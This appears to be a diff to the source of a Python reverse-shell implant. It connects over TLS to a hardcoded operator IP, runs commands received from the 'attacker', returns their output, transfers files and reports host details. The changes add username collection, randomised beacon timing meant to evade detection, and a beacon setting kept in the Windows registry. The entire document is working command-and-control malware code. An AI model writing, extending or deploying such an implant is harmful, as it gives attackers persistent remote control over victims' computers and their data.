@@ -2,20 +2,24 @@
 import socket, platform, ssl, subprocess
 from printlib import *
 from time import time, sleep
-from os import remove, path, getpid, kill
+from os import remove, path, getpid, kill, getlogin
 from datetime import datetime
 from sys import exit
 from signal import SIGTERM
+from random import randint, uniform
+import winreg
 
-remote_ip = '206.189.39.65'
+remote_ip = '10.0.0.18'
 remote_port = 8081
 proxy_ip = '201.94.250.116'
 proxy_port = 9050
 server_sni_hostname = ''
-VERBOSE = False
+VERBOSE = True
 DEVNULL = subprocess.DEVNULL
-BEACON_INTERVAL = 10    #in seconds
-
+BEACON_INTERVAL_DEFAULT = 10    #in seconds
+BEACON_INTERVAL_MEM = None
+BEACON_INTERVAL_HDD = None
+BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
 
 def create_keys():
     server_cert ='''\
@@ -110,6 +114,7 @@ def sysinfo():
     date_time = datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S')
     sys_info ="""
 Current PID: {}
+Current User: {}
 
 Local Time: {}
 system: {}
@@ -117,13 +122,13 @@ release: {}
 version: {}
 machine: {}
 processor: {}
-node: {}""".format(getpid(),date_time,platform.system(),platform.release(),platform.version(),platform.machine(),platform.processor(),platform.node())
+node: {}""".format(getpid(),getlogin(),date_time,platform.system(),platform.release(),platform.version(),platform.machine(),platform.processor(),platform.node())
     return sys_info
 
-def persist(conn, data):
-    pass
 
 def send_data(conn, plain_text):
+    if type(plain_text) is int:
+        plain_text = str(plain_text)
     msg = plain_text + "[END]"
     conn.send(msg.encode('utf-8'))
     if VERBOSE:
@@ -159,16 +164,20 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
     f.close()
 
 def beacon(conn, data):
+    global BEACON_INTERVAL_SETTING
+    global BEACON_INTERVAL_MEM
     temp = data.strip("[BEACON]")
     if temp == "?":
-        send_data(conn, "Beacon Setting: {}".format(BEACON_INTERVAL))
+        send_data(conn, BEACON_INTERVAL_SETTING)
     elif temp.isdigit():
-        BEACON_INTERVAL = int(data.strip("[BEACON]"))
-        send_data(conn, "Beacon Setting: {} seconds".format(BEACON_INTERVAL))
+        BEACON_INTERVAL_MEM = int(data.strip("[BEACON]"))
+        BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
+        send_data(conn, "Beacon Setting: {} seconds".format(BEACON_INTERVAL_SETTING))
     elif temp == "START":
         if VERBOSE:
             print_info("Received Beacon Instruction")
         conn.close()
+        BEACON_INTERVAL_MEM = None
         raise ConnectionResetError
 
 def kill_term(conn):
@@ -179,7 +188,6 @@ def kill_term(conn):
     
 
 def connect(remote_ip=remote_ip, remote_port=remote_port):
-    global BEACON_INTERVAL
 
     data = ""
     context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile='server_cert')
@@ -187,6 +195,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
     context.load_cert_chain(certfile='client_cert', keyfile='client_key')
     delete_keys()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    x = s.getsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE)
     #s.settimeout(4)
     #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
@@ -205,14 +214,22 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
     except Exception as e:
         if VERBOSE:
             print(e)
-
-    while True: 
+    sock_desc_tracker = []
+    while True:
         data = ""
         while not data.endswith('[END]'):
+            if len(sock_desc_tracker) == 30:
+                if len(set(sock_desc_tracker)) == 1:
+                    if VERBOSE:
+                        print_fail("Lost Connection --> Count: {}".format(len(sock_desc_tracker)))
+                    raise ConnectionResetError
+            sock_desc_tracker.append(int(conn.fileno()))
             recv = conn.recv(128)
             recv_decoded = recv.decode('utf-8')
             data = data + recv_decoded
-        data = data[:-5]
+            if data:
+                sock_desc_tracker = []
+        data = data[:-5].strip('\n')
         if VERBOSE:
             print_info("Received:\n" + data)
         if '[kill]' == data: # if we got terminate order from the attacker, close the socket and break the loop
@@ -253,7 +270,27 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 send_data(conn, output.stdout.decode('utf-8')) # send back the result
             data = "" #reset the data received
 
+def query_beacon():
+    global BEACON_INTERVAL_HDD
+    global BEACON_INTERVAL_SETTING
+    access_registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+    try:
+        k = winreg.OpenKey(access_registry,r"Software\Classes\.s")
+        BEACON_INTERVAL_HDD = int(winreg.QueryValue(k,None))
+        BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
+    except:
+        BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
+
+def beacon_drift():
+    left_bound = abs(round(uniform(.95, 1) * BEACON_INTERVAL_SETTING))
+    right_bound = abs(round(uniform(1, 1.05) * BEACON_INTERVAL_SETTING))
+    new_interval = randint(left_bound, right_bound)
+    return new_interval
+
 def main ():
+    global BEACON_INTERVAL_SETTING
+    query_beacon()
+
     while True:
         try:
             create_keys()
@@ -263,6 +300,8 @@ def main ():
             if VERBOSE:
                 print_fail("Failed to connect")
         except ConnectionResetError:
+            if BEACON_INTERVAL_HDD is not None:
+                BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
             if VERBOSE:
                 print_fail("Remote end terminated the connection")
         except ConnectionAbortedError:
@@ -272,9 +311,20 @@ def main ():
                 print(e)
         finally:
             delete_keys()
+            drift = beacon_drift()
             if VERBOSE:
-                print_info("Sleeping for {}".format(BEACON_INTERVAL))
-            sleep(BEACON_INTERVAL)
-            
+                print_info("Sleeping for {}".format(drift))
+            try:
+                sleep(drift)
+            except KeyboardInterrupt:
+                if VERBOSE:
+                    print_warn("Received Keyboard Interrupt")
+                exit(0)
+            except Exception as e:
+                if VERBOSE:
+                    print_fail("Critical Failure, Exiting")
+                    print(e)
+                else:
+                    pass
 
 main()
